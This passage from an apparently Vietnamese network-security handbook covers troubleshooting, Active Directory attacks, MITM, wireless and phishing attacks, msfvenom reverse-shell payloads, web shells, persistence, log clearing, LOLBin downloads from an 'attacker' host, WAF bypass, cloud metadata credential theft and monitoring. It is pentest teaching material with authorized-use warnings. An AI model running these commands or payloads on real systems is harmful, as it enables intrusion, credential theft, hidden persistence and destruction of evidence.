+  EF (Expedited Forwarding) = 46: Voice (highest priority)
+  AF (Assured Forwarding): 4 classes × 3 drop precedence
+  CS (Class Selector): Backward compatible with IP Precedence
+  BE (Best Effort) = 0: Default
+
+802.1p / CoS (Class of Service):
+  3 bits trong 802.1Q VLAN tag
+  0 = Best Effort, 5 = Voice, 7 = Network Control
+```
+
+## 25.8 Troubleshooting Methodology
+
+```
+=== OSI-Based Approach ===
+
+Bottom-Up (Physical → Application):
+  1. Check cables, link lights
+  2. Check MAC, switch port, VLAN
+  3. Check IP, subnet, gateway, routing
+  4. Check port, firewall rules
+  5. Check DNS, application config
+  Best for: hardware/connectivity issues
+
+Top-Down (Application → Physical):
+  1. Check application logs, service running
+  2. Check DNS resolution
+  3. Check firewall, ports open
+  4. Check IP connectivity (ping gateway, ping remote)
+  5. Check physical (cable, interface up)
+  Best for: application/service issues
+
+Divide-and-Conquer:
+  Start at Layer 3 (ping)
+  → Works → problem is above (L4-L7)
+  → Fails → problem is below (L1-L2)
+  Best for: faster isolation
+
+=== Common Commands per Layer ===
+L1: check link lights, cable tester, show interface status
+L2: show mac address-table, show vlan, arp -a
+L3: ping, traceroute, show ip route, ip addr
+L4: ss -tlnp, netstat -an, telnet host port
+L7: curl, nslookup, dig, application logs
+```
+
+## 25.9 Tools Bổ sung
+
+```bash
+# === mtr (My Traceroute) - Kết hợp ping + traceroute ===
+mtr 8.8.8.8                      # Realtime, continuous
+mtr -r -c 100 8.8.8.8            # Report mode (100 cycles)
+# Hiển thị: mỗi hop + loss% + latency → tìm bottleneck
+
+# === pathping (Windows - tương tự mtr) ===
+pathping 8.8.8.8
+
+# === hping3 - Packet crafting CLI ===
+# TCP SYN scan
+hping3 -S -p 80 192.168.1.100
+
+# TCP flood (rate limited)
+hping3 -S --flood -p 80 192.168.1.100
+
+# Custom flags
+hping3 -F -S -R -p 80 192.168.1.100    # FIN+SYN+RST
+
+# ICMP with custom data
+hping3 -1 -d 120 192.168.1.100
+
+# Traceroute mode
+hping3 --traceroute -S -p 443 8.8.8.8
+
+# === nbtstat (Windows - NetBIOS info) ===
+nbtstat -a 192.168.1.100         # Remote NetBIOS name table
+nbtstat -n                       # Local NetBIOS names
+nbtstat -c                       # NetBIOS cache
+
+# === arp command ===
+arp -a                           # Show ARP table
+arp -d 192.168.1.100             # Delete ARP entry
+arp -s 192.168.1.100 AA:BB:CC:DD:EE:FF   # Static entry
+
+# === DNS tools bổ sung ===
+# CAA record (Certificate Authority Authorization)
+dig target.com CAA
+# Chỉ định CA nào được phép issue certificate cho domain
+
+# SOA record chi tiết
+dig target.com SOA
+# MNAME: Primary nameserver
+# RNAME: Admin email (@ thay bằng .)
+# Serial: Version number (tăng mỗi khi update)
+# Refresh: Secondary check primary interval
+# Retry: Retry interval nếu refresh fail
+# Expire: Secondary ngừng serve nếu không refresh được
+# Minimum TTL: Negative caching TTL
+```
+
+---
+
+# PHẦN 26: AD ATTACKS TOÀN TẬP
+
+> **CẢNH BÁO**: Các kỹ thuật AD attack CHỈ sử dụng trong authorized pentest hoặc lab. Tấn công Active Directory trái phép = vi phạm nghiêm trọng.
+
+## 26.1 Domain Enumeration Nâng cao
+
+```bash
+# === BloodHound (AD Attack Path Visualization) ===
+# Thu thập data
+bloodhound-python -u user -p 'password' -d target.com -c All -ns 192.168.1.1
+# Hoặc SharpHound trên Windows
+.\SharpHound.exe -c All
+
+# Import vào BloodHound → Visualize attack paths
+# Queries quan trọng:
+# - Shortest path to Domain Admin
+# - Find Kerberoastable accounts
+# - Find AS-REP roastable accounts
+# - Users with DCSync rights
+# - Unconstrained delegation computers
+```
+
+## 26.2 Credential Attacks Nâng cao
+
+### Password Attack Taxonomy
+
+```
+┌─────────────────────────────────────────────────────────┐
+│                    Password Attacks                      │
+├──────────────────┬──────────────────┬───────────────────┤
+│ Brute Force      │ Password Spray   │ Credential Stuff  │
+├──────────────────┼──────────────────┼───────────────────┤
+│ 1 user,          │ 1 password,      │ Known user:pass   │
+│ many passwords   │ many users       │ pairs from leaks  │
+│                  │                  │                   │
+│ High lockout risk│ Low lockout risk │ Uses breach data  │
+│ Slow per user    │ Across many users│ Very effective     │
+│                  │                  │ (password reuse)  │
+│ hydra, medusa    │ crackmapexec     │ Custom scripts    │
+│                  │ spray.sh         │                   │
+└──────────────────┴──────────────────┴───────────────────┘
+
+Online: Against live service (rate limited, lockout risk)
+Offline: Against captured hash (GPU, unlimited speed)
+```
+
+### Hashcat Mode Cheat Sheet
+
+```
+Mode    Hash Type                    Example
+─────   ──────────────────────────   ─────────────────
+0       MD5                          5d41402abc4b2a76...
+100     SHA1                         aaf4c61ddcc5e8a2...
+1000    NTLM                        aad3b435b514...
+1800    sha512crypt (Linux)          $6$rounds$salt$hash
+3200    bcrypt                       $2a$12$salt...hash
+5600    NetNTLMv2                    user::domain:chall:hash
+7500    Kerberos 5 AS-REQ (RC4)
+13100   Kerberos 5 TGS-REP (RC4)    Kerberoasting
+18200   Kerberos 5 AS-REP (RC4)     AS-REP Roasting
+22000   WPA-PBKDF2-PMKID+EAPOL      WiFi
+```
+
+## 26.3 Critical AD Vulnerabilities
+
+```bash
+# === ZeroLogon (CVE-2020-1472) ===
+# Nguyên lý: Flaw trong Netlogon protocol (AES-CFB8)
+# → Set DC machine account password = empty → DCSync
+zerologon_tester.py DC01 192.168.1.1
+cve-2020-1472-exploit.py DC01 192.168.1.1
+secretsdump.py -no-pass -just-dc target.com/DC01\$@192.168.1.1
+
+# === PrintNightmare ===
+# CVE-2021-1675 (LPE) + CVE-2021-34527 (RCE)
+# Nguyên lý: Print Spooler service cho phép load DLL qua SMB share → SYSTEM shell
+# CVE-2021-1675.py = LPE exploit, CVE-2021-34527 = RCE variant
+CVE-2021-1675.py target.com/user:password@192.168.1.1 '\\attacker\share\evil.dll'
+
+# === PetitPotam (MS-EFSRPC) ===
+# Nguyên lý: Coerce DC authentication → relay to ADCS → get DC cert → DCSync
+# Bước 1: Start relay
+ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs
+# Bước 2: Coerce auth
+PetitPotam.py attacker-ip dc-ip
+# Bước 3: Use cert for auth
+certipy auth -pfx dc.pfx -dc-ip 192.168.1.1
+
+# === noPac (CVE-2021-42287/42278) ===
+# Nguyên lý: Create machine account → rename to DC → request TGT → rename back → get TGS as DC
+noPac.py target.com/user:password -dc-ip 192.168.1.1 --impersonate Administrator -dump
+
+# === DCSync ===
+# Nguyên lý: User với Replicating Directory Changes rights
+# → Giả làm DC, request password replication
+secretsdump.py target.com/admin:password@192.168.1.1 -just-dc-ntlm
+
+# Mimikatz:
+mimikatz> lsadump::dcsync /user:krbtgt /domain:target.com
+
+# === DCShadow ===
+# Nguyên lý: Register rogue DC → push malicious changes → replicate
+# → Stealth persistence (changes appear legitimate)
+mimikatz> lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512
+
+# === Skeleton Key ===
+# Nguyên lý: Patch LSASS trên DC → accept "master password" cho mọi user
+# Password gốc vẫn hoạt động → khó phát hiện
+mimikatz> misc::skeleton
+# Giờ login bất kỳ user nào với password "mimikatz"
+
+# === AdminSDHolder Abuse ===
+# Nguyên lý: AdminSDHolder object propagates ACL cho privileged groups mỗi 60 phút
+# → Thêm ACE cho attacker vào AdminSDHolder → persistence
+# → Dù admin xóa quyền, 60 phút sau sẽ được restore
+
+# === GPO Abuse ===
+# Nếu có write access vào GPO linked to OU chứa target:
+# → Add scheduled task, startup script, hoặc security settings
+# Tools: SharpGPOAbuse, pyGPOAbuse
+
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Default Domain Policy"
+
+# === LAPS (Local Administrator Password Solution) ===
+# LAPS lưu local admin password trong AD attribute
+# Nếu có read access:
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
+# Hoặc
+crackmapexec ldap dc-ip -u user -p pass -M laps
+
+# === Shadow Credentials ===
+# Nguyên lý: Modify msDS-KeyCredentialLink attribute → add attacker's key
+# → Authenticate as target without knowing password
+pywhisker.py -d target.com -u user -p pass --target victim --action add
+certipy auth -pfx victim.pfx -dc-ip 192.168.1.1
+
+# === DPAPI Secrets ===
+# DPAPI protects: Chrome passwords, RDP credentials, WiFi passwords, Credential Manager
+# Decrypt with domain backup key:
+secretsdump.py target.com/admin:pass@dc-ip -just-dc-ntlm
+dpapi.py backupkeys -t target.com/admin:pass@dc-ip
+```
+
+## 26.4 NTLM Relay Paths Chi tiết
+
+```
+NTLM Relay: Chuyển tiếp NTLM authentication từ victim → target service
+
+┌────────┐ NTLM Auth    ┌──────────┐ Forward NTLM   ┌────────┐
+│ Victim │ ────────────> │ Attacker │ ──────────────> │ Target │
+│(DC/Srv)│               │(Relay)   │                 │(LDAP/  │
+│        │               │          │ <────────────── │ SMB/   │
+│        │               │          │ Auth success!   │ ADCS)  │
+└────────┘               └──────────┘                 └────────┘
+
+Step 1: Coerce victim to authenticate (PetitPotam, PrinterBug, etc.)
+Step 2: Victim sends NTLM Type 1 (Negotiate) → Attacker
+Step 3: Attacker forwards Type 1 → Target
+Step 4: Target sends Type 2 (Challenge) → Attacker
+Step 5: Attacker forwards Type 2 → Victim
+Step 6: Victim sends Type 3 (Auth with challenge response) → Attacker
+Step 7: Attacker forwards Type 3 → Target
+Step 8: Target authenticates → Attacker has SESSION as victim!
+
+Source → Target    What you get
+───────────────    ──────────────────────────
+SMB → SMB          Shell (nếu target admin + SMB signing off)
+SMB → LDAP         Modify AD objects (ACL, group membership)
+SMB → LDAPS        Same + TLS
+SMB → HTTP (ADCS)  Request certificate → authenticate as victim
+HTTP → SMB         Shell
+HTTP → LDAP        Modify AD objects
+WebDAV → LDAP      Coerce auth từ workstation (không cần SMB signing bypass)
+
+# Kiểm tra SMB Signing
+crackmapexec smb 192.168.1.0/24 --gen-relay-list nosigning.txt
+
+# WebDAV relay (không yêu cầu SMB signing disabled!)
+# Vì WebDAV gửi NTLM qua HTTP, không phải SMB
+ntlmrelayx.py -t ldap://dc-ip --delegate-access
+# Trigger:
+# Tạo file .searchConnector-ms hoặc .url trên share accessible
+```
+
+---
+
+# PHẦN 27: ADVANCED ATTACK TECHNIQUES
+
+> **CẢNH BÁO**: Các kỹ thuật nâng cao này CHỈ dùng trong authorized pentest, CTF, hoặc lab. Nhiều kỹ thuật ở đây bypass security controls → sử dụng trái phép = vi phạm pháp luật.
+
+## 27.1 MITM Nâng cao
+
+### mitm6 (IPv6 MITM)
+
+```bash
+# Nguyên lý: Windows prefer IPv6 over IPv4
+# mitm6 giả làm DHCPv6 server → cung cấp DNS IPv6 = attacker
+# → Victim gửi DNS queries cho attacker → NTLM auth relay
+
+# Bước 1: Start mitm6
+sudo mitm6 -d target.com
+
+# Bước 2: Start relay (kết hợp ntlmrelayx)
+ntlmrelayx.py -6 -t ldaps://dc-ip --delegate-access
+
+# → Khi victim reboot/renew DHCP → auto-authenticate → relay → profit
+```
+
+### WPAD Poisoning
+
+```bash
+# Nguyên lý: Windows tự tìm proxy qua WPAD (Web Proxy Auto-Discovery)
+# Tìm theo: DHCP option 252 → DNS (wpad.domain.com) → LLMNR/NBT-NS broadcast
+
+# Responder tự động respond WPAD requests
+sudo responder -I eth0 -wrf
+# -w: WPAD proxy
+# Victim browser tự configure proxy = attacker → capture all HTTP traffic + creds
+```
+
+### LLMNR vs mDNS vs NBT-NS
+
+```
+3 protocols fallback khi DNS thất bại:
+
+LLMNR (Link-Local Multicast Name Resolution):
+  Multicast 224.0.0.252, port UDP 5355
+  Windows Vista+ default enabled
+  Scope: Local subnet
+
+NBT-NS (NetBIOS Name Service):
+  Broadcast, port UDP 137
+  Legacy Windows
+  Scope: Local subnet
+
+mDNS (Multicast DNS):
+  Multicast 224.0.0.251, port UDP 5353
+  macOS/Linux (Bonjour/Avahi), Windows 10+
+  Scope: Local subnet, .local domain
+
+Tất cả KHÔNG có authentication → Responder poisoning hoạt động cho cả 3
+
+# Phòng chống:
+# Disable LLMNR: GPO → Computer Config → Admin Templates → DNS Client → Turn Off Multicast Name Resolution
+# Disable NBT-NS: Network adapter → WINS tab → Disable NetBIOS over TCP/IP
+# Tốt nhất: Deploy DNS đúng cách để không cần fallback
+```
+
+## 27.2 Wireless Attacks Nâng cao
+
+### WPA3 / Dragonblood
+
+```
+WPA3 dùng SAE (Simultaneous Authentication of Equals):
+  Dragonfly handshake thay 4-way handshake
+  → Resistant to offline dictionary attacks
+  → Forward secrecy
+
+Dragonblood attacks (CVE-2019-9494/9495/9496):
+  1. Side-channel (timing/cache): Leak thông tin về password
+  2. Downgrade: Force WPA2 transition mode → attack WPA2 handshake
+  3. Denial of Service: Forge SAE commit messages
+
+# Test:
+dragondrain: DoS tool cho WPA3-SAE
+dragonslayer: Downgrade attack
+dragontime: Timing attack
+dragonforce: Offline dictionary (sau side-channel)
+```
+
+### KARMA Attack
+
+```
+Nguyên lý: Device broadcast probe request cho known networks
+KARMA AP respond: "Yes, I am ALL of those networks!"
+→ Device auto-connect → MITM
+
+# Dùng hostapd-mana
+hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
+
+# hoặc Wifi-Pumpkin3
+```
+
+### 802.11w / PMF (Protected Management Frames)
+
+```
+802.11w protects: Deauth, Disassociation, Action frames
+→ Attacker KHÔNG THỂ gửi deauth giả nếu PMF required
+
+Bypass:
+  Nếu PMF optional (capable but not required):
+  → Force downgrade → deauth vẫn hoạt động
+  Authentication/Association flood (không protected bởi PMF)
+```
+
+## 27.3 Phishing Network Attacks
+
+### Evilginx2 (Adversary-in-the-Middle Phishing)
+
+```bash
+# Nguyên lý: Reverse proxy giữa victim và real site
+# Capture credentials + session cookies (bypass MFA!)
+
+# Cài đặt
+go install github.com/kgretzky/evilginx2@latest
+
+# Cấu hình
+evilginx2
+: config domain attacker.com
+: config ip VPS_IP
+: phishlets hostname o365 login.attacker.com
+: phishlets enable o365
+: lures create o365
+: lures get-url 0
+# → Gửi URL cho victim
+# → Victim đăng nhập bình thường (thấy real site)
+# → Evilginx capture session cookie → bypass MFA
+
+# Phòng chống: FIDO2/WebAuthn (hardware key), token binding
+```
+
+## 27.4 Msfvenom - Payload Generation
+
+```bash
+# === Staged vs Stageless ===
+# Staged (windows/meterpreter/reverse_tcp): Gửi stager nhỏ trước, download full payload sau
+# Stageless (windows/meterpreter_reverse_tcp): Full payload trong 1 file (lớn hơn nhưng reliable hơn)
+
+# Windows reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe
+
+# Linux reverse shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o shell.elf
+
+# Web payloads
+msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f asp -o shell.asp
+msfvenom -p cmd/unix/reverse_python LHOST=attacker LPORT=4444 -f raw
+
+# DLL
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll
+
+# Encoders (basic evasion)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
+
+# Listener (Metasploit)
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST attacker
+set LPORT 4444
+exploit
+```
+
+## 27.5 Web Shells
+
+```bash
+# === p0wny-shell (PHP) ===
+# Single file, interactive terminal in browser
+# https://github.com/flozz/p0wny-shell
+# Upload p0wny.php → access via browser
+
+# === weevely (Python + PHP) ===
+# Generate agent
+weevely generate password agent.php
+# Upload agent.php to target
+# Connect
+weevely http://target.com/agent.php password
+
+# === China Chopper ===
+# 1-line PHP: <?php @eval($_POST['pass']); ?>
+# Client connects and sends commands via POST
+
+# === SharPyShell (ASPX) ===
+# Encrypted .NET web shell
+python SharPyShell.py generate -p password
+# Upload to IIS → connect
+```
+
+---
+
+# PHẦN 28: POST-EXPLOITATION & PERSISTENCE
+
+> **CẢNH BÁO**: Post-exploitation và persistence techniques CHỈ cho authorized pentest. Cài persistence trái phép = backdoor = vi phạm nghiêm trọng.
+
+## 28.1 Token Impersonation & Privilege Escalation
+
+```bash
+# === Potato Family (Service Account → SYSTEM) ===
+# Exploit SeImpersonatePrivilege
+
+# JuicyPotato (Windows Server 2016/2019)
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
+
+# PrintSpoofer (Windows 10 / Server 2019+)
+PrintSpoofer.exe -i -c cmd
+
+# GodPotato (Latest, works on newest Windows)
+GodPotato.exe -cmd "cmd /c whoami"
+
+# Sweet Potato (all-in-one)
+SweetPotato.exe -p cmd.exe
+
+# === Incognito (Token Impersonation) ===
+# Trong Meterpreter:
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> impersonate_token "DOMAIN\\Administrator"
+```
+
+## 28.2 Persistence Techniques
+
+```bash
+# === Windows Persistence ===
+
+# Registry Run Key
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\payload.exe"
+
+# Scheduled Task
+schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM
+
+# Service
+sc create Updater binPath= "C:\payload.exe" start= auto
+sc start Updater
+
+# WMI Event Subscription (stealthy)
+# Filter + Consumer + Binding → execute payload on event
+# Ví dụ: Execute khi user login, khi process start, mỗi X phút
+
+# Startup Folder
+copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+# DLL Hijacking / DLL Search Order
+# Place malicious DLL where application searches before legitimate DLL
+
+# COM Object Hijacking
+# Modify registry CLSID → point to malicious DLL
+
+# Golden Ticket / Silver Ticket → xem Phần 14
+
+# === Linux Persistence ===
+
+# Crontab
+(crontab -l; echo "*/5 * * * * /tmp/shell.sh") | crontab -
+
+# SSH Authorized Keys
+echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+
+# Backdoor user
+useradd -ou 0 -g 0 -M -d /root -s /bin/bash backdoor
+echo "backdoor:password" | chpasswd
+
+# Systemd service
+# /etc/systemd/system/backdoor.service
+[Unit]
+Description=System Service
+[Service]
+ExecStart=/tmp/shell.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+
+# .bashrc / .profile
+echo '/tmp/shell.sh &' >> /root/.bashrc
+
+# SUID binary
+cp /bin/bash /tmp/.hidden
+chmod u+s /tmp/.hidden
+# Execute: /tmp/.hidden -p
+```
+
+## 28.3 Anti-Forensics
+
+```bash
+# === Log Clearing ===
+# Windows
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+# PowerShell
+Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
+
+# Linux
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+history -c && history -w
+
+# === Timestomping ===
+# Modify file timestamps (MACE: Modified, Accessed, Created, Entry)
+# Metasploit:
+meterpreter> timestomp secret.txt -m "01/01/2020 00:00:00"
+
+# Linux:
+touch -t 202001010000 secret.txt
+
+# === LOLBins (Living Off the Land Binaries) ===
+# Dùng binary có sẵn trong OS → ít bị phát hiện
+
+# Download file:
+certutil -urlcache -split -f http://attacker/payload.exe payload.exe
+bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\payload.exe
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/payload.exe','C:\payload.exe')"
+curl http://attacker/payload.exe -o payload.exe   # Windows 10+
+
+# Execute:
+rundll32 payload.dll,EntryPoint
+regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
+mshta http://attacker/payload.hta
+wmic process call create "payload.exe"
+
+# Encode/Decode:
+certutil -encode payload.exe encoded.txt
+certutil -decode encoded.txt payload.exe
+
+# Reference: https://lolbas-project.github.io (Windows)
+# Reference: https://gtfobins.github.io (Linux)
+```
+
+---
+
+# PHẦN 29: WAF, VPN & DNS SECURITY
+
+## 29.1 WAF (Web Application Firewall) Chi tiết
+
+### ModSecurity
+
+```bash
+# ModSecurity = Open source WAF engine
+# Chạy như module cho Apache, Nginx, IIS
+
+# Cài đặt (Apache)
+apt install libapache2-mod-security2
+cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
+# Đổi: SecRuleEngine DetectionOnly → SecRuleEngine On
+
+# OWASP Core Rule Set (CRS)
+git clone https://github.com/coreruleset/coreruleset.git
+cp coreruleset/crs-setup.conf.example /etc/modsecurity/crs-setup.conf
+cp -r coreruleset/rules/ /etc/modsecurity/
+
+# Paranoia Levels:
+# PL1 (default): Ít false positive, bỏ lỡ một số attack
+# PL2: Thêm rules, nhiều false positive hơn
+# PL3: Aggressive, cần tuning
+# PL4: Maximum, rất nhiều false positive
+
+# SecRule syntax:
+# SecRule VARIABLE OPERATOR "ACTIONS"
+SecRule ARGS "@contains <script>" "id:1001,phase:2,deny,status:403,msg:'XSS Detected'"
+SecRule REQUEST_URI "@rx /(etc|proc)/" "id:1002,phase:1,deny,msg:'Path Traversal'"
+```
+
+### WAF Bypass Techniques
+
+```
+1. Encoding:
+   <script> → %3Cscript%3E (URL encode)
+   <script> → %253Cscript%253E (double encode)
+   <script> → &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62; (HTML entities)
+
+2. Case variation:
+   <ScRiPt> → bypass case-sensitive rules
+
+3. Chunked Transfer:
+   Transfer-Encoding: chunked
+   → Chia payload thành chunks nhỏ
+
+4. HTTP Parameter Pollution:
+   ?id=1&id=UNION SELECT... → WAF check param 1, app dùng param 2
+
+5. JSON/XML obfuscation:
+   {"query": "admin' OR '1'='1"} → WAF miss nếu chỉ check URL params
+
+6. Null bytes / special chars:
+   admin%00' OR 1=1-- → null byte confuse WAF parser
+
+7. Alternate syntax:
+   SQL: UNION SELECT → UNI/**/ON SEL/**/ECT
+   XSS: <img src=x onerror=alert(1)> → <img/src=x onerror=alert(1)>
+
+8. Request smuggling:
+   Desync frontend (WAF) and backend → WAF doesn't see the attack
+```
+
+## 29.2 VPN Security Issues
+
+```
+=== Split Tunneling ===
+Split tunnel: Chỉ traffic đến corporate network đi qua VPN
+Full tunnel: TẤT CẢ traffic đi qua VPN
+
+Risk: Split tunnel → traffic ra Internet KHÔNG encrypted
+→ Attacker trên local network có thể sniff non-VPN traffic
+
+=== DNS Leak ===
+Nguyên lý: VPN tunnel active nhưng DNS queries vẫn đi qua ISP DNS
+→ ISP thấy domain bạn truy cập
+Test: https://dnsleaktest.com
+
+Fix:
+  - Force DNS qua VPN tunnel
+  - Block non-VPN DNS (iptables/firewall)
+  - VPN client DNS leak protection setting
+
+=== WebRTC Leak ===
+WebRTC (browser feature) có thể reveal real IP qua STUN request
+→ Dù đang dùng VPN, website biết IP thật
+
+Test: https://browserleaks.com/webrtc
+Fix: Disable WebRTC trong browser
+  Firefox: media.peerconnection.enabled = false
+  Chrome: uBlock Origin extension → block WebRTC
+
+=== VPN Kill Switch ===
+Nếu VPN disconnect → traffic đi ra KHÔNG encrypted
+Kill switch = block TẤT CẢ traffic khi VPN down
+
+# Linux iptables kill switch:
+iptables -P OUTPUT DROP
+iptables -A OUTPUT -o tun0 -j ACCEPT           # VPN interface OK
+iptables -A OUTPUT -o eth0 -p udp --dport 1194 -j ACCEPT  # Allow VPN connection
+iptables -A OUTPUT -o lo -j ACCEPT              # Loopback OK
+```
+
+## 29.3 DNS Security
+
+### DNSSEC (DNS Security Extensions)
+
+```
+Nguyên lý: Ký DNS records bằng cryptographic signatures
+→ Client verify: response đến từ authoritative server, không bị tamper
+
+Components:
+  RRSIG:   Signature cho DNS record
+  DNSKEY:  Public key để verify signature
+  DS:      Hash of DNSKEY (stored ở parent zone)
+  NSEC/NSEC3: Prove record KHÔNG tồn tại (authenticated denial)
+
+Chain of Trust:
+  Root → .com → example.com
+  Mỗi level ký DS record cho level dưới
+
+# Kiểm tra DNSSEC
+dig +dnssec example.com
+dig DNSKEY example.com
+dig DS example.com @parent-ns
+
+# Limitation: DNSSEC KHÔNG encrypt DNS queries
+# → Vẫn bị sniffing. Chỉ đảm bảo integrity và authenticity.
+```
+
+### DoT & DoH
+
+```
+DNS over TLS (DoT):
+  Port: TCP 853
+  Encrypt DNS queries giữa client → resolver
+  Dễ block (port 853 dễ nhận diện)
+
+DNS over HTTPS (DoH):
+  Port: TCP 443 (cùng HTTPS traffic)
+  DNS queries đi trong HTTPS requests
+  KHÓ block (lẫn vào HTTPS traffic thường)
+
+# Security monitoring tradeoff:
+# DoT/DoH = privacy tốt cho user
+# NHƯNG = mù cho security team (không thể inspect DNS queries)
+# → Enterprise thường block DoH và force DNS qua internal resolver
+
+# Resolver hỗ trợ:
+# Cloudflare: 1.1.1.1 (DoT + DoH)
+# Google: 8.8.8.8 (DoT + DoH)
+# Quad9: 9.9.9.9 (DoT + DoH + malware filtering)
+```
+
+---
+
+# PHẦN 30: CLOUD SECURITY NÂNG CAO
+
+## 30.1 GCP (Google Cloud Platform) Networking
+
+```
+VPC: Global (không giới hạn region như AWS)
+Subnets: Regional (không per-AZ)
+Firewall Rules: VPC-level (không per-instance như AWS SG)
+  - Default: deny all ingress, allow all egress
+  - Priority-based (0-65535, lower = higher priority)
+  - Target: tags, service accounts, all instances
+Cloud NAT: Managed NAT gateway
+Cloud Armor: WAF + DDoS protection (L7)
+Cloud Load Balancing: Global, Anycast
+VPC Peering, Shared VPC, VPN, Interconnect
+
+# Common misconfigs:
+# Firewall rule 0.0.0.0/0 allow all
+# Service account keys exposed
+# Cloud Storage bucket public
+# Metadata server (169.254.169.254) → steal service account token
+```
+
+## 30.2 Cloud-Specific Attacks
+
+```bash
+# === IMDS (Instance Metadata Service) ===
+# AWS IMDSv1 (vulnerable to SSRF):
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+# → Returns temporary AWS credentials!
+
+# IMDSv2 (requires PUT token):
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+
+# GCP Metadata:
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure Metadata:
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# === VPC Flow Logs Analysis ===
+# AWS: CloudWatch Logs / S3 / Athena
+# Format: version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status
+
+# Athena query: Find SSH brute force
+SELECT srcaddr, count(*) as attempts
+FROM vpc_flow_logs
+WHERE dstport = 22 AND action = 'REJECT'
+GROUP BY srcaddr
+HAVING count(*) > 100
+ORDER BY attempts DESC;
+
+# Athena query: Large data transfers (exfiltration?)
+SELECT srcaddr, dstaddr, sum(bytes) as total_bytes
+FROM vpc_flow_logs
+WHERE action = 'ACCEPT'
+GROUP BY srcaddr, dstaddr
+HAVING sum(bytes) > 1000000000
+ORDER BY total_bytes DESC;
+```
+
+## 30.3 AWS WAF
+
+```
+# AWS WAF Rules
+# Managed rule groups: AWSManagedRulesCommonRuleSet, SQLi, XSS
+# Custom rules: Rate-based, IP match, regex, geo match
+
+# AWS WAF + CloudFront / ALB
+# Rate limiting:
+{
+  "Name": "RateLimit",
+  "Priority": 1,
+  "Action": { "Block": {} },
+  "Statement": {
+    "RateBasedStatement": {
+      "Limit": 1000,
+      "AggregateKeyType": "IP"
+    }
+  }
+}
+```
+
+---
+
+# PHẦN 31: MONITORING, IR & FORENSICS NÂNG CAO
+
+## 31.1 Network Monitoring Tools
+
+### Prometheus + Grafana
+
+```yaml
+# Prometheus: Time-series metrics collection
+# Grafana: Visualization dashboards
+
+# SNMP Exporter (monitor network devices)
+# prometheus.yml:
+scrape_configs:
+  - job_name: 'snmp'
+    static_configs:
+      - targets: ['192.168.1.1']    # Switch/Router IP
+    metrics_path: /snmp
+    params:
+      module: [if_mib]
+
+# Blackbox Exporter (probe endpoints)
+  - job_name: 'blackbox'
+    metrics_path: /probe
+    params:
+      module: [http_2xx]
+    static_configs:
+      - targets:
+        - http://example.com
+        - https://internal-app:8080
+
+# Alert example (AlertManager):
+groups:
+  - name: network
+    rules:
+      - alert: HighPacketLoss
+        expr: probe_success == 0
+        for: 5m
+        labels:
+          severity: critical
+```
+
+### Nagios / Zabbix
+
+```
+Nagios:
+  - Agent-based + agentless monitoring
+  - Plugins: check_ping, check_tcp, check_snmp
+  - Alerting: email, SMS, webhook
+
+Zabbix:
+  - Agent-based + SNMP + IPMI
+  - Auto-discovery
+  - Network topology maps
+  - Better scalability than Nagios
+
+# Zabbix SNMP monitoring:
+# Configuration → Hosts → Create Host
+# Add SNMP interface
+# Link template: "Template Net Network Generic Device SNMPv2"
+# → Auto-discovers interfaces, bandwidth, errors
+```
+
+## 31.2 Memory Forensics (Network Artifacts)
+
+```bash
+# === Volatility 3 ===
+# Extract network connections from memory dump
+
+# List network connections
+vol -f memory.dmp windows.netscan
+vol -f memory.dmp windows.netstat
+
+# Output: PID, Protocol, Local Address, Foreign Address, State, Created
+# → Tìm: Connections đến C2, unusual ports, suspicious IPs
+
+# Linux memory
+vol -f memory.lime linux.sockstat
+
+# DNS cache from memory
+vol -f memory.dmp windows.dnsresolver
+
+# Browser history from memory
+vol -f memory.dmp windows.filescan | grep -i "history"
